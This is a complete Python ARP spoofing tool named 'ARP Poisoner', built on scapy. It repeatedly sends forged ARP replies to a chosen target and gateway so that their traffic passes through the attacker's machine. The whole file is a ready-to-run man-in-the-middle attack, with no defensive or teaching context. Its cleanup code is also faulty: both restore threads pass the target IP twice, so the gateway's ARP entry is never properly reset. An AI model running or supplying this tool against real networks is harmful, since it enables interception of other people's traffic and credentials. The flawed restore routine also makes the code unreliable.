#!/usr/bin/python3.8
import scapy.all as scapy
import sys
import argparse
import threading
import time
from termcolor import colored
import netifaces
import pyfiglet

def get_input_from_user():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', dest='target_ip', help='Please specify The target IP.')
    parser.add_argument('-g', '--gateway', dest='gateway_ip', help='Please specify The gateway IP.')
    parser.add_argument('-i', '--interface', dest='interface', help='Please specify an interface to Use.')
    args = parser.parse_args()
    if not args.target_ip:
        print('[{}] {}'.format(colored('?', 'red'), colored('Please specify the target IP Address.', 'red')))
        sys.exit(1)
    elif not args.gateway_ip:
        print('[{}] {}'.format(colored('?', 'red'), colored('Please specify the gateway IP Address.', 'red')))
        sys.exit(1)
    else:
        return args

def get_mac_by_interface(interface):
    address = 'addr'
    return netifaces.ifaddresses(interface)[17][0][address]

def get_mac(target_ip):
    arp_request = scapy.ARP()
    arp_request.pdst = target_ip
    broadcast = scapy.Ether()
    broadcast.dst = 'ff:ff:ff:ff:ff:ff'
    combination = broadcast / arp_request
    answered_list = scapy.srp(combination, timeout=1, verbose=0)[0]
    if answered_list[0][1].hwsrc:
        return answered_list[0][1].hwsrc
    else:
        return

def spoof(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP()
    packet.op = 2
    packet.hwdst = target_mac
    packet.pdst = target_ip
    packet.psrc = gateway_ip
    if packet:
        scapy.send(packet, verbose=0)
    else:
        print('[{}] {}'.format(colored('?', 'red'), colored('Error packet creation, try again to fix this error', 'red')))

def restore(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    packet = scapy.ARP()
    packet.op = 2
    packet.hwdst = target_mac
    packet.pdst = target_ip
    packet.hwsrc = gateway_mac
    packet.psrc = gateway_ip
    scapy.send(packet, verbose=0, count=4)

def main():
    args = get_input_from_user()
    target_ip = args.target_ip
    gateway_ip = args.gateway_ip
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    try:
        ascii_banner = pyfiglet.figlet_format('ARP Poisoner')
        print(colored(ascii_banner.strip('\n'), 'cyan', attrs=['bold']))
        print('-'*78)
        print('[{}] The ARP spoofing is running ...'.format(colored('+', 'cyan', attrs=['bold'])))
        print('-'*78)
        print('[{}] The IP address of the gateway is {} and the MAC is {}'
              .format(colored('+', 'blue', attrs=['bold']), gateway_ip, gateway_mac))
        print('[{}] The IP address of the target is {} and the MAC is {}'
              .format(colored('+', 'blue', attrs=['bold']), target_ip, target_mac))
        count = 0

        while True:
            count += 2
            target_spoof = threading.Thread(target=spoof, args=[target_ip, gateway_ip])
            gateway_spoof = threading.Thread(target=spoof, args=[gateway_ip, target_ip])
            target_spoof.start()
            gateway_spoof.start()
            print('\r[{}] Send {} to the target {} and the gateway {}.'
                  .format(colored('+', 'blue', attrs=['bold']), str(count), target_mac, gateway_mac), end='')
            time.sleep(1.5)

    except KeyboardInterrupt:
        print("\n\n[{}] Detected CTRL + C ... Resetting ARP tables..... Please wait.\n".format(colored('-', 'blue')))
        restore_target = threading.Thread(target=restore, args=[target_ip, target_ip])
        restore_gateway = threading.Thread(target=restore, args=[target_ip, target_ip])
        restore_target.start()
        restore_gateway.start()
        restore_target.join()
        restore_gateway.join()
        print('[{}] The ARP tables is resetting successfully...'.format(colored('+', 'blue', attrs=['bold'])))
        print('[{}] Good Bye!'.format(colored('+', 'blue', attrs=['bold'])))
        sys.exit(1)

if __name__ == '__main__':
    main()


